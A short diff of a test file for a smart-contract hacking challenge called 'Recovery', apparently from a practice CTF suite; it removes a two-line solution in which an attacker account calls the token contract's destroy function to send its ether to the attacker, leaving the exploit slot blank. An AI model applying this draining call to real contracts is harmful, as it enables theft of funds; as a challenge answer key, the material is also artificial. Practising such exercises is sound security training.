@@ -29,8 +29,7 @@ describe('[Challenge] Recovery', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        let destroyTX = await this.token.connect(attacker).destroy(attacker.address); await destroyTX.wait();
-        console.log(`\t ether in token contract balance: ${await ethers.provider.getBalance(this.token.address)}`);
+        
     }).timeout(0);
 
     after(async () => {
